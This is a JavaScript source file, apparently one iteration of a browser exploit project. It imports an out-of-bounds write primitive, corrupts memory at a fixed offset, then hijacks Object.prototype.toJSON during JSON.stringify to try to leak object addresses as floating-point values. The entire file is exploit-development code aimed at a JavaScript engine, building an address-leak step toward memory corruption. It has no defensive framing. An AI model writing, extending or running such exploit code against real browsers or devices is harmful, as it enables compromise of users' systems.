// js/script3/testArrayBufferVictimCrash.mjs (v85a_FixRefError)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

// Renomeado para refletir a correção
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V85A_FRE = "OriginalHeisenbug_TypedArrayAddrof_v85a_FixRefError";

const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE_V85A = 0xFFFFFFFF; 

let object_to_leak_A_v85a = null;
let object_to_leak_B_v85a = null;
let victim_primitive_array_v85a = null; // Corrigido para _v85a
let probe_call_count_v85a = 0;
let all_probe_interaction_details_v85a = []; 
const PROBE_CALL_LIMIT_V85A = 10; 


function toJSON_TA_Probe_SprayAndCorruptArray_FRE() { // Renomeado para _FRE
    probe_call_count_v85a++;
    const call_num = probe_call_count_v85a;
    let current_call_details = { 
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v85a_FixRefError", // Atualizado
        this_type: Object.prototype.toString.call(this),
        this_is_victim_array_el: (victim_primitive_array_v85a && victim_primitive_array_v85a.includes && victim_primitive_array_v85a.includes(this)),
        this_is_victim_array_itself: (this === victim_primitive_array_v85a),
        this_value_if_primitive: (typeof this !== 'object' && typeof this !== 'function') ? String(this) : null,
        error_in_probe: null
    };
    logS3(`[PROBE_V85a] Call #${call_num}. 'this': ${current_call_details.this_type}${current_call_details.this_value_if_primitive ? " (Val: "+current_call_details.this_value_if_primitive+")" : ""}. IsVictimArrEl? ${current_call_details.this_is_victim_array_el}. IsVictimArr? ${current_call_details.this_is_victim_array_itself}`, "leak");
    all_probe_interaction_details_v85a.push(current_call_details);

    try {
        if (call_num > PROBE_CALL_LIMIT_V85A) { return { recursion_stopped_v85a: true }; }

        if (current_call_details.this_is_victim_array_el && current_call_details.this_type === '[object Object]') {
            logS3(`[PROBE_V85a] Call #${call_num}: 'this' is an object from victim_primitive_array_v85a. Default serialization.`, "info");
        } else if (current_call_details.this_type === '[object Object]') {
            logS3(`[PROBE_V85a] Call #${call_num}: 'this' is an unexpected [object Object]. Default serialization.`, "warn");
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
    }
    
    if (current_call_details.this_is_victim_array_el || current_call_details.this_is_victim_array_itself) {
        return undefined; 
    }
    return { generic_marker_v85a: call_num }; 
}


export async function executeTypedArrayVictimAddrofTest_SprayAndCorruptPrimitiveArray_FixRefError() { // Renomeado
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85A_FRE}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (SprayAndCorruptPrimitiveArray_FixRefError) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85A_FRE} Init...`;

    probe_call_count_v85a = 0;
    all_probe_interaction_details_v85a = [];
    // CORREÇÃO AQUI: Usar a variável correta que foi declarada no escopo do módulo
    victim_primitive_array_v85a = null; 
    object_to_leak_A_v85a = { marker_A_v85a: "LeakA_v85aFRE" }; 
    object_to_leak_B_v85a = { marker_B_v85a: "LeakB_v85aFRE" };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    
    let addrof_A = { success: false, msg: "Addrof A from array: Default" };
    let addrof_B = { success: false, msg: "Addrof B from array: Default" };

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE_V85A, 4);
        logS3(`  Critical OOB write done.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_primitive_array_v85a = [
            1.1, 2.2, 3.3, 4.4, 5.5, 
            object_to_leak_A_v85a, 
            6.6, 
            object_to_leak_B_v85a,
            7.7, 8.8
        ];
        logS3(`STEP 2: victim_primitive_array_v85a created with ${victim_primitive_array_v85a.length} elements.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_SprayAndCorruptArray_FRE, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_primitive_array_v85a); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
            } catch (e_parse) {
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }
            
            logS3("STEP 3: Checking stringifyOutput_parsed (serialized array) for leaked addresses...", "warn", FNAME_CURRENT_TEST);
            if (Array.isArray(stringifyOutput_parsed)) {
                stringifyOutput_parsed.forEach((element, index) => {
                    logS3(`  Output Array[${index}]: ${JSON.stringify(element)}`, "leak");
                    if (victim_primitive_array_v85a[index] === object_to_leak_A_v85a) {
                        if (typeof element === 'number' && !isNaN(element) && element !== 0) {
                            let num_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([element]).buffer)[0], new Uint32Array(new Float64Array([element]).buffer)[1]);
                            if ((num_int64.high() > 0 && num_int64.high() < 0x000F0000) || ((num_int64.high() & 0xFFFF0000) === 0xFFFF0000 && num_int64.high() !== 0xFFFFFFFF)) {
                               addrof_A.success = true; addrof_A.msg = `Possible pointer for ObjA at index ${index}: ${num_int64.toString(true)}`;
                               logS3(`  !!!! POTENTIAL POINTER for ObjA at index ${index}: ${num_int64.toString(true)} (Val: ${element}) !!!!`, "vuln");
                            } else { if (!addrof_A.success) addrof_A.msg = `ObjA at index ${index} is num but not ptr: ${element}`; }
                        } else { if (!addrof_A.success) addrof_A.msg = `ObjA at index ${index} not leaked as num. Val: ${JSON.stringify(element)}`;}
                    }
                    if (victim_primitive_array_v85a[index] === object_to_leak_B_v85a) {
                         if (typeof element === 'number' && !isNaN(element) && element !== 0) {
                            let num_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([element]).buffer)[0], new Uint32Array(new Float64Array([element]).buffer)[1]);
                            if ((num_int64.high() > 0 && num_int64.high() < 0x000F0000) || ((num_int64.high() & 0xFFFF0000) === 0xFFFF0000 && num_int64.high() !== 0xFFFFFFFF)) {
                               addrof_B.success = true; addrof_B.msg = `Possible pointer for ObjB at index ${index}: ${num_int64.toString(true)}`;
                               logS3(`  !!!! POTENTIAL POINTER for ObjB at index ${index}: ${num_int64.toString(true)} (Val: ${element}) !!!!`, "vuln");
                            } else { if (!addrof_B.success) addrof_B.msg = `ObjB at index ${index} is num but not ptr: ${element}`; }
                        } else { if (!addrof_B.success) addrof_B.msg = `ObjB at index ${index} not leaked as num. Val: ${JSON.stringify(element)}`;}
                    }
                });
            } else { /* ... */ }

            if (addrof_A.success || addrof_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85A_FRE}: AddrInArray SUCCESS!`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85A_FRE}: AddrInArray Fail`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85A_FRE}: Stringify ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85A_FRE} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v85a}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A from Array: Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B from Array: Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_primitive_array_v85a = null; 
        all_probe_interaction_details_v85a = []; 
        probe_call_count_v85a = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        stringifyResult: stringifyOutput_parsed, 
        toJSON_details: (all_probe_interaction_details_v85a && all_probe_interaction_details_v85a.length > 0) ? 
                        JSON.parse(JSON.stringify(all_probe_interaction_details_v85a)) : null,
        total_probe_calls: probe_call_count_v85a, // Será 0 devido ao reset no finally
        addrof_A_result: addrof_A,
        addrof_B_result: addrof_B
    };
}
